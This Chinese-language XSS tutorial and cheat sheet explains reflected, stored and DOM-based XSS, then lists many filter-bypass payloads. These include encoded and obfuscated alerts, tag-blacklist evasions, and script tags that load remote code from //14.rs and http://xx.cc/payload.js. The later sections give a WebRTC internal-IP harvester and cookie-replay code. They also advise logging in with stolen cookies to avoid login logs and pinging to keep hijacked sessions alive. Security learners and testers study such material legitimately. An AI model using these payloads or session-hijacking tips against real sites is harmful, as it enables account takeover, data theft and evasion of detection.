### 简介

跨站脚本攻击(Cross Site Scripting)

* [HackerOne上已公开的各种XSS漏洞](https://hackerone.com/hacktivity?order_direction=DESC&order_field=popular&filter=type%3Apublic&querystring=XSS)
* 各浏览器下的XSSpayload[Cross-Site Scripting (XSS) Cheat Sheet - 2020 Edition](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### 分类

* 通用型(Universal XSS)
  * 原理 - UXSS是浏览器漏洞导致. 如果浏览器存在UXSS漏洞则"所有站点"都可被XSS攻击
* 反射型(Reflected XSS)
  * 原理 - 某个web应用自身设计缺陷,导致HTTP response中的部分内容由HTTP request中的参数值(XSSpayload)控制
  * XSSpayload位置 - 共2处
    * 必然每次HTTP request 中都有XSSpayload
    * 必然每次HTTP response 中都有XSSpayload
  * 检测方法1 - 自动化方法(脚本) - 构造并发送HTTP request(含有XSSpayload),并查看HTTP response的内容，即可确定是否存在Reflected XSS
  * 检测方法2 - 浏览器(headless) - 构造并发送HTTP request(含有XSSpayload),根据headless调试进行判断，如果执行成功则存在DOM Based XSS
* 存储型(Stored XSS)
  * 原理 - 某个web应用自身设计缺陷,第一次发送的HTTP request(含有XSSpayload),后端将含有XSSpayload的数据存储到数据库.请求某个页面时后端读取到含有XSSpayload的内容,并组合成响应HTTP response(含有XSSpayload)返回给浏览器端,XSSpayload执行
  * XSSpayload位置 - 共3处
    * HTTP request - 第一次发送的HTTP request(含有XSSpayload)
    * 存储 - 后端将含有XSSpayload的数据存储到数据库
    * HTTP response - 请求某个页面时后端读取到含有XSSpayload的内容,并组合成响应HTTP response(含有XSSpayload)返回给浏览器端
  * 检测方法1 - 自动化方法(脚本)
    * 存储 - 构造并发送HTTP request(含有XSSpayload)完成第一次输入
    * 判断 - 通过脚本等自动化方法访问可能解析该XSSpayload的URL，根据HTTP response的内容如果含有XSSpayload则存在Stored XSS
  * 检测方法2  - 浏览器(headless)
    * 存储 - 构造并发送HTTP request(含有XSSpayload)完成第一次输入
    * 判断 - 通过浏览器(headless)访问若干个可能解析该XSSpayload的页面，根据headless调试进行判断，如果确认执行成功则存在Stored XSS
* DOM型(DOM Based XSS)
  * 原理:"DOM型XSS"依赖DOM解析过程，所以必须手工构造XSSpayload并使浏览器端解析DOM，才能执行XSSpayload. 检测它也必须解析DOM.
  * XSSpayload位置 - 共1处
    * 仅在html页面中 根据漏洞原理可看出 "DOM型XSS"与HTTP的请求响应没有直接关系(所以HTTP request/response中一定没有XSSpayload)
  * 检测方法1  - 浏览器&开发者工具 - 查看经过js解析过的html代码，输入构造的数据并查看其前端解析，构造的payload执行成功则存在DOM Based XSS
  * 检测方法2  - 使用浏览器(headless) - 根据该页面的前端代码设计缺陷，通常在浏览器(headless)的URL输入框构造XSSpayload并访问，使前端解析并执行该XSSpayload，根据headless调试进行判断，如果确认执行成功则存在DOM Based XSS

#### 基础知识 - DOM

* DOM (Document Object Model)  html中每一个元素都是"节点":
  * 文档是一个文档节点
  * 所有的HTML元素都是元素节点
  * 所有的HTML属性都是属性节点
  * 文本插入到HTML元素是文本节点
  * 注释是注释节点

### 详细分析DOM-XSS的3个阶段

```
数据输入源 --> (处理) --> 数据输出点 触发XSS
Sources --> ... --> Sinks
```

举例说明:
* 用户输入 - 如`document.URL`在chrome浏览器下是经过url编码的字符. 其组成部分`location.href` `location.pathname` `location.search` `location.hash`等都是经过URL编码的字符.
* 处理数据 - 此时URL为 `xx.com/pathname#javascript:alert(1)` 如果未对该用户输入数据做任何处理 则容易触发XSS
* 触发DOM-XSS - 触发位置较多
   * JS代码逻辑
   * 标签属性值 - 由于HTML标签的属性 有些属性支持 `javascipt:` 伪协议，如果这些属性可控则可实现xss
     * 1.chrome测试通过 - `a`标签的`href`属性 点击触发 `<a href=javascript:alert(1)>click me!!</a>`
     * 2.chrome测试通过 - 许多标签的"事件处理属性"  自动触发 `<img src onerror=javascript:alert(1) >` 而其`src`属性并不支持`javascipt:`
   * ...

#### 阶段1.数据源

参考Google Code [domxsswiki](https://github.com/wisec/domxsswiki)

数据源(Sources) 即用户输入能够影响以下参数(如果处理不当可能会有"DOM型XSS")
```
# Sources 1: URL-based DOM Property Sources

# 整个URL
document.URL
document.documentURI
document.baseURI

# 部分URL
location
location.href
location.search
location.hash
location.pathname

----

## Sources 2: Communication based Sources

# Ajax (XMLHTTPRequest/Fetch)

# WebSocket

# Window Messaging
window.postMessage

----

## Sources 3: Storage-based Sources

document.cookie
localStorage
sessionStorage

----

## Sources 4: Navigation-based DOM Property Sources

window.name
document.referrer

----

## 其他Sources

history.pushState()
history.replaceState()
```

```
例子：浏览器开启开发者模式 访问 https://cn.bing.com/search?q=location#abc

得到完整URL
location.href
"https://cn.bing.com/search?q=location#abc"

返回一个URL的锚部分 即 #号及之后的内容(如果URL中没有#号则返回空)
location.hash
"#abc"

返回URL路径名 即第一个/号到?号之间的内容(如果URL中没有?号则是/号到#号之间的内容 如果URL中没有#号则是到URL结束之间的内容)
location.pathname
"/search"

返回一个URL的查询部分 得到`?`之后到`#`之前的内容(如果URL中没有#号则是到URL结束之间的内容)
location.search
"?q=location"
```

#### 阶段2.处理数据

```
web应用处理用户输入数据
如果没做处理 或没做好正确的处理 则容易被攻击者构造出payload 触发XSS
```

#### 阶段3.数据输出点(Sinks) 触发XSS

可能导致DOM based XSS漏洞的函数: (具体能否成功 取决于 阶段1 阶段2)
```
## Sinks 1: Sinks that execute payload as JavaScript

eval
Function
setTimeout
setInterval
setImmediate
execScript
ScriptElement.src
ScriptElement.text
ScriptElement.textContent
ScriptElement.innerText
anyTag.onEventName   // <div onclick="alert(1)">

----

## Sinks 2: Sinks that execute payload as HTML

anyElement.innerHTML
anyElement.outerHTML
document.write   // Will overwrite the page.
document.writeln // Will overwrite the page.

----

## Sinks 3: Sinks that evaluate JavaScript URIs

window.location
document.location      // 例1 document.location='javascript:alert(2)';  //location is a structured object, with properties corresponding to the parts of the URL.
document.location.href // 例2 document.location.href='javascript:alert(1)';  // location.href is the whole URL in a single string. Assigning a string to either is defined to cause the same kind of navigation, so take your pick.
location.assign        // 例3 location.assign("javascript:alert(1)")
location.replace       // 例4 location.replace("javascript:alert(1)")

<form action='javascript:alert(1)'> <input type=submit> </form>  // submit 提交表单时触发XSS

----

## 其他Sinks

Range.createContextualFragment
crypto.generateCRMFRequest
```

#### DOM based XSS 实例1 - 从anyElement.innerHTML触发

* 对某html元素内的
  * "HTML代码" 进行读`outerHTML`   写`innerHTML`【可导致XSS】
  * "纯文本" 进行读 `outerText`   写 `innerText`

```html
<div id="test">
   <span style="color:red">test1</span> test2
</div>
```

```
// 使用 .innerHTML .outerHTML 能够读取/写入元素中的html代码.  在console下测试：


// 执行  test.innerHTML
// 输出  <span style="color:red">test1</span> test2

// 执行  test.innerText
// 输出  test1 test2

// 执行  test.outerHTML
// 输出  <div id="test"><span style="color:red">test1</span> test2</div>

// 执行 document.documentElement.innerHTML
// 输出 整个html document的内容
```

可知 `anyElement.innerHTML`可以将html代码写入该元素


构造poc1.html
```html
<a id=a></a>
<title id=b></title>
<div id=c></div>

<script>
document.getElementById("a").innerHTML="<img src=@ onerror=alert(1) />";
document.getElementById("b").innerHTML="<img src=@ onerror=alert(2) />";
document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
</script>
```


打开poc1.html

通过浏览器的开发者工具 查看经过DOM解析(javascript执行后)的页面代码:
```html
<html><head></head>
<body>
<a id="a"><img src="@" onerror="alert(1)"></a>
<title id="b">&lt;img src=@ onerror=alert(2) /&gt;</title>
<div id="c"><img src="@" onerror="alert(3)"></div>

<script>
document.getElementById("a").innerHTML="<img src=@ onerror=alert(1) />";
document.getElementById("b").innerHTML="<img src=@ onerror=alert(2) />";
document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
</script>
</body>
</html>
```

发现 弹出`alert(3)` `alert(1)`(无顺序) 而没有`alert(2)` 原因如下:

**以下这些HTML标签** 比较特殊, 浏览器会把这些标签中的内容作为 **文本** 解析(而不会当作html代码进行解析).

具体实现就是对内容做了`Html实体(Html Entity)`编码).

所以当使用`.innerHTML`把内容写进以下这些HTML标签中时, 浏览器不会把其中内容作为 **html** 解析.

```html
<textarea>
<title>
<iframe>
<noscript>
<noframes>
<xmp>
<plaintext>
...
```


### XSS payload 变形

* 参考
  * [s0md3v/AwesomeXSS](https://github.com/s0md3v/AwesomeXSS#awesome-bypassing)
  * [MyPapers/Bypassing-XSS-detection-mechanisms](https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms)


* 注意
  * 以下这些Payload 大多数在Chrome 76.0.3809.132下测试成功，无法执行的已标注
  * 以下这些Payload 都没有用到single quotes(') 或 double quotes (")

- Without event handlers - 不用"事件处理属性"(event handler attribute)
```
# 用object标签的data属性 属性值为javascript:
# 这个payload在Chrome 76.0.3809.132下无法执行
<object data=javascript:confirm()>

# 用a标签的href属性 属性值为javascript:
<a href=javascript:confirm()>click here

# 用script的src属性 
<script src=//14.rs></script>

# 直接 函数名
<script>confirm()</script>
```

- 不使用空格
```
# 用正斜线 / 代替空格
<svg/onload=confirm()>
<iframe/src=javascript:alert(1)>
```

- 不使用正斜线`/`(slash)
```
# svg标签的"事件处理属性"
<svg onload=confirm()>
# img标签的"事件处理属性"
<img src=x onerror=confirm()>
```

- 不使用等号`=`(equal sign)

>[JSFuck](http://www.jsfuck.com/) 优点是只使用6个字符`()[]!+` 即可执行任意JavaScript代码. 缺点是太长了.
```
# 执行JavaScript语句 console.log(666)

# 方法1: eval函数
<script>eval(String.fromCharCode(99,111,110,115,111,108,101,46,108,111,103,40,54,54,54,41))</script>
<script>eval(atob`Y29uc29sZS5sb2coNjY2KQ`)</script>

# 方法2: HTML Entity (Hexadecimal)
# 优点: 不出现许多符号 如 = " ' ( ) ; 等
<svg><script>&#x63&#x6f&#x6e&#x73&#x6f&#x6c&#x65&#x2e&#x6c&#x6f&#x67&#x28&#x36&#x36&#x36&#x29</script><svg>

# 闭合input标签
"><script>document.writeln`<script+src\x3dhttp://xx.cc/payload.js><\x2fscript>`</script>
```

- 不使用括号`(` `)` 仅适用于某些情况下的反射型XSS
```
# 适用条件: "目标站" 存在反射型XSS(会将code参数的值放入JavaScript上下文中),但参数值不能出现 括号()
# 可使用以下payload实现XSS

https://vul.com/vulpage?code=
onhashchange=setTimeout;Object.prototype.toString=RegExp.prototype.toString;Object.prototype.source=location.hash;location.hash=null;#1/-alert(location.href)/
```

- 不使用尖括号`>`(angular bracket)来结束标签
```
# 使用//可以结束svg标签 需//之后有任意标签<x> 则svg标签中的JavaScript就能成功执行
<svg onload=confirm()//
```

- 不出现字符串 `alert` `confirm` `prompt`

```
# 外联js文件
<script src=//14.rs></script>
```

"事件处理属性"可用的编码方式:\u (Hexadecimal)
```
# "事件处理属性"可用的编码方式 \u编码
<svg onload=co\u006efirm()>
<svg onload=z=co\u006efir\u006d,z()>
<script>Object._ = Function,[{}][0].constructor._('co\u006efirm(666)')()</script>
```

"事件处理属性"可用的编码方式:HTML Entity (Hexadecimal)
```
html实体编码 十六进制  ( 如 字符a ->  &#x0061; )
<svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x32;&#x29;>

html实体编码 十六进制 (不带分号 chrome下可行)
<IMG src onerror=&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
```

"事件处理属性"可用的编码方式:HTML Entity (Decimal)
```
原始payload为 alert(1)  也可以是更长的 javascript:alert(1)

html实体编码 十进制
<svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;&#50;&#41;>

html实体编码 十进制 (不带分号 chrome下可行)
<svg/onload=&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#49&#41>
```

- 不使用有效的html标签
```
# 自定义一个名为x的tag
<x onclick=confirm()>click here
<x ondrag=confirm()>drag it
```

- Bypass tag blacklisting - 绕过HTML标签黑名单
```
# 绕过不严谨的判断 - 大小写
</ScRipT>

# 利用浏览器兼容性 - 畸形标签 删除最后的符号>
</script

# 利用浏览器兼容性 - 畸形标签 用/>替换符号>
</script/>

# 利用浏览器兼容性 - 畸形标签
</script x>
```

- 绕过某些黑名单规则 如`alert(`
```
(alert)(document.cookie)
((alert))((document.cookie))
```

- 绕过指定黑名单规则 `javascript:`
```html
<a href="javascript&colon;alert(1)">XSS</a>
<a href="java&Tab;script:alert(1)">XSS</a>
<a href="java&NewLine;script:alert(1)">XSS</a>
<a href="javascript&colon;alert&lpar;1&rpar;">XSS</a>
```

- 绕过某些黑名单规则 使用[jjencode](http://utf-8.jp/public/jjencode.html) 或 [aaencode](http://utf-8.jp/public/aaencode.html)编码. 注:编码后的内容可放在"事件处理属性"中 如`onerror=`
```
<script>
// 语句 alert(document.cookie); 的 jjencode 形式:
$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.$$_$+$._$+$.$$__+$._+"\\"+$.__$+$.$_$+$.$_$+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+$.__+"."+$.$$__+$._$+$._$+"\\"+$.__$+$.$_$+$._$$+"\\"+$.__$+$.$_$+$.__$+$.$$$_+");"+"\"")())();

// 语句 alert(document.cookie); 的 aaencode 形式:
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
</script>
```

- 绕过某些黑名单规则 使用emoji字符. 查询各种字符的各种编码 https://graphemica.com/%F0%9F%98%82
```
emoji字符  经过URL编码的值
 😂         %F0%9F%98%82


比如实际案例 #853637

Payload with an emoji :
%F0%9F%98%82<%3CsVg/onload%F0%9F%98%82=/svg/onload%3Dsvg/onmouseOver=confirm`1`><!--%F0%9F%98%82//=

Decoded Payload:
😂<<sVg/onload😂=/svg/onload=svg/onmouseOver=confirm`1`><!--😂//=
```

- 通过"代码重用"(code-reuse) 实现XSS

参考[Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets](https://acmccs.github.io/papers/p1709-lekiesA.pdf)
```
如果目标站点本来就用到了下面这2个JavaScript库
<script src="https://code.jquery.com/jquery-1.11.3.js"></script>
<script src="https://code.jquery.com/mobile/1.4.2/jquery.mobile-1.4.2.js"></script>

可使用以下payload实现XSS
<div data-role=popup id='--!><script>alert("XSS")</script>'></div>
```

#### Awesome Encoding

|HTML|Char|Numeric|Description|Hex|CSS (ISO)|JS (Octal)|URL|
|----|----|-------|-----------|----|--------|----------|---|
|`&quot;`|"|`&#34;`|quotation mark|u+0022|\0022|\42|%22|
|`&num;`|`#`|`&#35;`|number sign|u+0023|\0023|\43|%23|
|`&dollar;`|`$`|`&#36;`|dollar sign|u+0024|\0024|\44|%24|
|`&percnt;`|`%`|`&#37;`|percent sign|u+0025|\0025|\45|%25|
|`&amp;`|`&`|`&#38;`|ampersand|u+0026|\0026|\46|%26|
|`&apos;`|`'`|`&#39;`|apostrophe|u+0027|\0027|\47|%27|
|`&lpar;`|`(`|`&#40;`|left parenthesis|u+0028|\0028|\50|%28|
|`&rpar;`|`)`|`&#41;`|right parenthesis|u+0029|\0029|\51|%29|
|`&ast;`|`*`|`&#42;`|asterisk|u+002A|\002a|\52|%2A|
|`&plus;`|`+`|`&#43;`|plus sign|u+002B|\002b|\53|%2B|
|`&comma;`|`,`|`&#44;`|comma|u+002C|\002c|\54|%2C|
|`&minus;`|`-`|`&#45;`|hyphen-minus|u+002D|\002d|\55|%2D|
|`&period;`|`.`|`&#46;`|full stop; period|u+002E|\002e|\56|%2E|
|`&sol;`|/|`&#47;`|solidus; slash|u+002F|\002f|\57|%2F|
|`&colon;`|`:`|`&#58;`|colon|u+003A|\003a|\72|%3A|
|`&semi;`|`;`|`&#59;`|semicolon|u+003B|\003b|\73|%3B|
|`&lt;`|<|`&#60;`|less-than|u+003C|\003c|\74|%3C|
|`&equals;`|`=`|`&#61;`|equals|u+003D|\003d|\75|%3D|
|`&gt;`|`>`|`&#62;`|greater-than sign|u+003E|\003e|\76|%3E|
|`&quest;`|`?`|`&#63;`|question mark|u+003F|\003f|\77|%3F|
|`&commat;`|`@`|`&#64;`|at sign; commercial at|u+0040|\0040|\100|%40|
|`&lsqb;`|`[`|`&#91;`|left square bracket|u+005B|\005b|\133|%5B|
|`&bsol;`|`\`|`&#92;`|backslash|u+005C|\005c|\134|%5C|
|`&rsqb;`|`]`|`&#93;`|right square bracket|u+005D|\005d|\135|%5D|
|`&Hat;`|^|`&#94;`|circumflex accent|u+005E|\005e|\136|%5E|
|`&lowbar;`|`_`|`&#95;`|low line|u+005F|\005f|\137|%5F|
|`&grave;`|`|`&#96;`|grave accent|u+0060|\0060|\u0060|%60|
|`&lcub;`|`{`|`&#123;`|left curly bracket|u+007b|\007b|\173|%7b|
|`&verbar;`| \| |`&#124;`|vertical bar|u+007c|\007c|\174|%7c|
|`&rcub;`|`}`|`&#125;`|right curly bracket|u+007d|\007d|\175|%7d|

#### Awesome Tips & Tricks

- `http(s)://` 可以缩短为 `//` 或 `/\\` 或 `\\`
- `document.cookie` 可以缩短为 `cookie`  其他DOM objects也一样
- 优先用`confirm()` 再考虑用`alert()`  都不必传入实际参数`alert('XSS')`
- 用`//`能结束一个标签  而不要用`>`
- 当属性的值中没有空格符号时，没必要用引号去包裹属性的值 如`<script src=//14.rs>`   不必像这样`<script src="//14.rs">`
- 最短的HTML context XSS payload是 `<script src=//14.rs>` (19 chars)


### XSS漏洞影响

XSS漏洞的利用方式很多，JavaScript能实现的任何功能都是XSS的利用方式。

XSS proxy - 与XSS受害者的浏览器实时交互.  工具 [JShell](https://github.com/s0md3v/JShell)、[xsshell](https://github.com/raz-varren/xsshell)、[JSShell](https://github.com/Den1al/JSShell)

举例如下
* 操作浏览器的存储(Storage) - 对存储数据进行增删改查
  * `Cookie` - 如果没有`HttpOnly`则可查看到Cookie的key和value，跨域成功则可收到cookie中的数据，从而使用其身份(获取该用户特有的信息/执行该用户特有的操作)
    * 管理员凭证 可发起高权限操作 - 创建新的管理员账号 修改管理员密码...
    * 普通用户凭证 可发起普通用户权限操作 - 评论、发帖、转账...
  * `localStorage`
  * `sessionStorage`
  * `indexedDB`
  * `Web SQL Database`
* 探测内网 - 利用实时通信标准WebRTC 获取存活主机ip列表 甚至端口 进而识别服务、web应用与版本（如发现内网中的confluence、Jenkins等）
* 攻击内网 - 根据探测结果(或对所有内网ip)发起漏洞利用攻击流量（利用web系统漏洞：confluence系统命令执行等)
* XSStoRCE - 使用node.js作为web后端 或 基于node.js的桌面应用框架(如Electron) 都可能通过XSS实现RCE
* XSS蠕虫 - 在社交网站上传播速度极快 影响极大
* 键盘记录 - 记录按键
* 漏洞联合 - 使用XSS绕过CSRF保护机制 无交互地利用CSRF漏洞
   * 1.利用自身域名的XSS漏洞绕过CSRF防御机制 - 有的anti-CSRF机制为后端判断CSRFtoken的值，使用JavaScript找到CSRFtoken参数值并构造出"合法的"GET/POST请求 全程不存在跨域问题
   * 2.利用自身/兄弟/父子域名的XSS漏洞绕过CSRF防御机制 - 有的anti-CSRF机制是后端通过判断Referer的值，如果Referer的值 是自身/兄弟/父子域名下的url 就是"合法"请求
* 漏洞联合 - 通过已有的CSRF漏洞 利用self-XSS漏洞(变废为宝)
  * 利用过程 - 事实上self-XSS漏洞无法直接使对方触发，然而通过已有的CSRF漏洞构造"触发该self-XSS漏洞的"请求，对方触发CSRF漏洞即触发XSS漏洞
* 获取网页截图 - (HTML5) html2canvas
* 获取前端代码 - 如 得到管理员后台系统的前端代码(可根据表单字段名构造并发出异步请求 实现新增管理员账号)
* 钓鱼 - 获取各种凭证(编造理由 "WiFi固件更新，请重新输入您的凭据以进行身份验证" "重新登录域账号")
* 钓鱼 - 自动下载文件 诱导执行可执行文件(编造理由 "xx程序必须更新才能使用")
* 修改页面内容 - 如 广告(利用存储型XSS漏洞实现Ad-Jacking) 等
* 虚拟币挖矿 - 利用javascript实现Crypto Mining
* 获取表单输入 - 窃取表单输入框的内容(如口令输入框)
* 重定向 - Redirecting
* DOS - 构造HTTP请求实现(用户登录后)自动注销,使cookie失效.用户无法登录web应用,影响业务.
* DDoS - 应用层DDoS(Application-Level DDoS). 如持续发送HTTP请求到其他域名.
* 获取浏览器信息
  * 浏览器名称、版本 (根据User-agent获取)
  * 屏幕分辨率 (高度`window.screen.height;` 宽度`window.screen.width;`)
  * 语言
* 获取OS信息
  * 操作系统类型、版本(根据User-agent获取；如果浏览器支持Java Applet 则Applet更准确 可获取OS详情 JVM详情 内存容量等)
* 获取录音数据 - (HTML5) 浏览器会提示用户确认 Recording Audio
* 获取摄像数据 - (HTML5) 浏览器会提示用户确认 webcam
* 获取地理位置 - (HTML5) 浏览器会提示用户确认 Geo-location
* Clipboard operation
  * 设置剪切板的内容 - https://clipboardjs.com/
  * 读取剪切板的内容(Chrome)
    * `https://`协议下 只需申请一次读取剪切板的权限 则默认始终允许读取 [在线体验](https://1135.github.io/sites/3/read_clipborad.html)
    * `file://`协议下 每一次读取剪切板的内容 都会询问用户是否允许读取
* 读取本地文件 - 常见于非浏览器场景
* ...

#### XSS利用方式 - 探测内网

利用实时通信标准WebRTC 获取访问者内网IP demo:
```JavaScript
var findIP = new Promise(r=>{var w=window,a=new (w.RTCPeerConnection||w.mozRTCPeerConnection||w.webkitRTCPeerConnection)({iceServers:[]}),b=()=>{};a.createDataChannel("");a.createOffer(c=>a.setLocalDescription(c,b,b),b);a.onicecandidate=c=>{try{c.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g).forEach(r)}catch(e){}}})

// Show the Intranet IP using alert()
findIP.then(ip => alert('your ip: '+ip)).catch(e => console.error(e))
```

#### XSS利用方式 - 对浏览器的存储(Storage)增删改查

##### 增删改查 - cookie

```JavaScript
// 拿到cookie后
// 1.访问目标域名 浏览器设置该站点的cookie项 为拿到的cookie项 登录web系统
// web系统的"登录日志"功能会记录登录者的信息 "最后登录IP-时间" 而用cookie直接登录(比账号密码登录)web系统的大好处是 不会留下web登录日志!

function setCookie(name,value,days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}
function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}
function eraseCookie(name) {   
    document.cookie = name+'=; Max-Age=-99999999;';  
}

//调用函数 设置cookie项
setCookie('name','value',70);


// 2.保持使用Cookie 尽量使它不失效.
// 写脚本 携带拿到的cookie每60s左右发送1个HTTPrequest到后端. 可能会维持cookie长期有效. 具体效果取决于后端的"session管理"实现!  SessionManager
```

